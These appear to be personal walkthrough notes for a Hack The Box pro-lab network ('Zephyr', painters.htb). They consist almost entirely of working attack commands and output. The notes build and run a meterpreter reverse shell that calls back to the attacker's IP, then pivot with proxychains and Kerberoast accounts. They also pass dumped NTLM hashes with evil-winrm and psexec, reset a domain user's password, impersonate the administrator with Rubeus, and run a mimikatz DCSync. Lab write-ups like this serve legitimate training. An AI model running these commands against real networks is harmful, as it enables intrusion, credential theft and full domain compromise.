# Zephyr

{% code overflow="wrap" %}
```powershell
# IP Subnet
10.10.110.0/24
# Entry Host
10.10.110.35
painters.htb
# Email Addresses
info@painters.htb
# Users
Thomas Bishop
James Ray
Toby Harlington

# mail Server
mail.painters.htb, IP Address:192.168.110.51
# Certificate Authority
zsm-ZPH-SVRCA01-CA
# Attempt to fuzz parameters. 
ffuf -u 'https://painters.htb/views/service.php?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 5846


https://painters.htb/administration/logout
https://painters.htb/administration/login
https://painters.htb/administration/users
https://painters.htb/administration/dashboard
https://painters.htb/administration/applications
https://painters.htb/administration/application/download
https://painters.htb/administration/application/delete

# Credentials
PAINTERS\riley
P@ssw0rd
# Privesc
SSH_CONNECTION=10.10.14.3 36916 192.168.110.51 22
Potentially Vulnerable to CVE-2022-2588

blake:x:1002:1002:Blake Morris,,,:/home/blake:/bin/bash                                                                                                                                                               
daniel:x:1001:1001:Daniel Morris,,,:/home/daniel:/bin/bash                                                                                                                                                            
matt:x:1000:1000:Matt Fisher:/home/matt:/bin/bash                                                                                                                                                                     
riley:x:1003:1003:Riley Smart,,,:/home/riley:/bin/bash                                                                                                                                                                
root:x:0:0:root:/root:/bin/bash

# Find the Domain Controller
sudo proxychains nmap -sT -Pn -n 192.168.110.0/24 -p 389
# Confirm the linux account works with the Domain Controller
proxychains crackmapexec smb 192.168.110.55 -u riley -p 'P@ssw0rd'
# Run bloodhound
proxychains bloodhound-python -d painters.htb -u riley -p 'P@ssw0rd' -dc dc.painters.htb -c DCOnly -ns 192.168.110.55 --dns-tcp
# nmap scans
## 192.168.110.52
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds



# shares DC
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 



# Kerberoastable
blake
web_svc
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.110.55 painters.htb/riley -outputfile hashes.kerberoast

```
{% endcode %}

## Introduction

{% code overflow="wrap" %}
```bash
ssh riley@$ip
P@ssw0rd
# Create shell to upload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf > shell.elf
# Make shell executeable
chmod +x shell.elf
# Copy shell to linux host
scp shell.elf riley@$ip:/tmp/shell.elf
# In Meterpreter 
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lport 443
run
# Run shell in background
./shell.elf&


run autoroute -s 192.168.110.0/24

```
{% endcode %}

## Disclosure

```bash
# Connect with evil-winrm
proxychains evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'

# Hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
James:8af1903d3c80d3552a84b6ba296db2ea
```

## Persistence (PNT-SVRBPA)

{% code overflow="wrap" %}
```bash
# Use James hash from previous host
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea

# Hash dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:23ea5ff648e7ec7dcd1bfef8e9434099:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# SharpHound
.\SharpHound.exe -d painters.htb --ldapusername riley --ldappassword P@ssw0rd
```
{% endcode %}

## Blake - User account

{% code overflow="wrap" %}
```bash
# Login using a system shell to PNT-SVRBPA
# System Shell
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# James Shell
proxychains evil-winrm -i 192.168.110.53 -u james -H 8af1903d3c80d3552a84b6ba296db2ea
upload /home/kali/share/PowerView.ps1
# Run PowerShell in system shell
powershell

# Change User password
## Connect as system
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py james@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
# Import PowerView
cd \Windows\Tasks
powershell
. .\PowerView.ps1
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity blake -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}

## DC

{% code overflow="wrap" %}
```bash
# On .53 from Meterpreter
# Request ticket
.\Rubeus.exe s4u /user:blake /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:"cifs/dc.painters.htb" /altservice:http,host,ldap /ptt
# Run mimikatz
mimikatz.exe
# Perform dcsync
lsadump::dcsync /domain:painters.htb /all
```
{% endcode %}
